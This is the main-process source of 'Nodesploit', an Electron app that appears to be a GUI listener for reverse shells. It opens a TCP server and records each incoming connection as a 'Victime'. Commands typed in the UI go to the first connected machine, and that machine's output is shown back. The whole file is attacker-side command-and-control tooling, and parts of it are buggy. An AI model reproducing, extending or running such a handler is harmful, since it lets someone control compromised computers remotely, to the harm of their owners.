const { app, ipcMain, Notification } = require("electron");

import { mainWindow, loadingWindow } from "./window";
import { nanoid } from "nanoid";

import store from "@/store";

/**
 * Set `__static` path to static files in production
 * https://simulatedgreg.gitbooks.io/electron-vue/content/en/using-static-assets.html
 */
if (process.env.NODE_ENV !== "development") {
  global.__static = require("path")
    .join(__dirname, "/static")
    .replace(/\\/g, "\\\\");
}

class Nodesploit {
  constructor() {
    this.mainWin = null;
    this.loadWin = null;
    this.server = null;
    this.sockets = [];
  }

  init() {
    this.lifecycle();
    this.ipc();
  }

  lifecycle() {
    app.on("ready", () => {
      this.loadWin = loadingWindow();
      this.createMainWindow();
    });

    app.on("window-all-closed", () => {
      if (process.platform !== "darwin") {
        app.quit();
      }
    });

    app.on("activate", () => {
      if (mainWindow === null) {
        createWindow();
      }
    });
  }

  createMainWindow() {
    this.mainWin = mainWindow();
    this.mainWin.webContents.on("did-finish-load", () => {
      this.mainWin.show();
      this.loadWin.destroy();
    });
    this.mainWin.on("closed", () => {
      this.mainWin = null;
    });
  }

  createServer(connection) {
    const net = require("net");
    this.server = new net.Server();

    process.on("SIGTERM", () => {
      this.server.close();
    });

    this.server.on("listening", () => {
      var notif = new Notification({
        title: "Server is ON",
        body: `Le serveur ecoute sur le port ${
          this.server.address().port
        } et l'adresse ${this.server.address().address}`,
      });

      notif.show();
    });

    this.server.on("close", () => {
      var notif = new Notification({
        title: "Server closed",
        body: "Le serveur n'ecoute plus sur le port",
      });

      notif.show();
      this.mainWin.webContents.send("closeConnection");
    });

    this.server.on("error", (e) => {
      if (e.code === "EADDRINUSE") {
        console.log("Address in use, retrying...");

        // this.closeServer().then(() => {
        //   this.server.listen(connection.port, connection.ip);
        // });
      }
    });

    this.server.on("connection", (socket) => {
      this.sockets.push(socket);
      socket.id = nanoid(10);
      socket.setEncoding("utf8");
      console.log(`[💀] New Victime: ${socket.id}`);
      var notif = new Notification({
        title: "Nouvelles connexion !",
        body: `une nouvelles connexion entrant ${socket.remoteAddress}`,
      });

      this.mainWin.webContents.send("newConnection", {
        id: socket.id,
        ip: socket.remoteAddress,
      });

      notif.show();

      // Socket is fully quitted

      socket.on("error", (e) => {
        console.log(e);
        if (e.code == "ECONNRESET") {
          console.log("Socket end shell with CTRL+C");
        }
      });

      socket.on("close", () => {
        this.mainWin.webContents.send("slaveQuitted", socket.id);
      });

      socket.on("end", () => {
        this.mainWin.webContents.send("slaveQuitted", socket.id);
      });

      ipcMain.on("cmd", (event, res) => {
        this.sockets[0].write(res.trim() + "\n");
      });

      socket.on("data", (data) => {
        this.mainWin.webContents.send("datarec", data.toString("utf8"));
      });
    });

    this.server.listen({ host: connection.ip, port: connection.port }, () => {
      console.log(`🔥 Server listen in ${connection.port}`);
    });

    return this.server.listening;
  }

  closeServer() {
    if (this.server.close()) {
      return true;
    }
  }

  ipc() {
    ipcMain.on("close-app", () => {
      app.quit();
    });

    ipcMain.on("maximize-app", () => {
      if (this.mainWin.isFullScreen()) {
        this.mainWin.setFullScreen(false);
      } else {
        this.mainWin.setFullScreen(true);
      }
    });

    ipcMain.on("minimize-app", () => {
      this.mainWin.minimize();
    });

    ipcMain.handle("serverlisten", (event, connection) => {
      this.createServer(connection);
    });

    ipcMain.handle("server-stoplisten", () => {
      this.closeServer();
    });
  }
}

new Nodesploit().init();

/**
 * Auto Updater
 *
 * Uncomment the following code below and install `electron-updater` to
 * support auto updating. Code Signing with a valid certificate is required.
 * https://simulatedgreg.gitbooks.io/electron-vue/content/en/using-electron-builder.html#auto-updating
 */

/*
import { autoUpdater } from 'electron-updater'

autoUpdater.on('update-downloaded', () => {
  autoUpdater.quitAndInstall()
})

app.on('ready', () => {
  if (process.env.NODE_ENV === 'production') autoUpdater.checkForUpdates()
})
 */
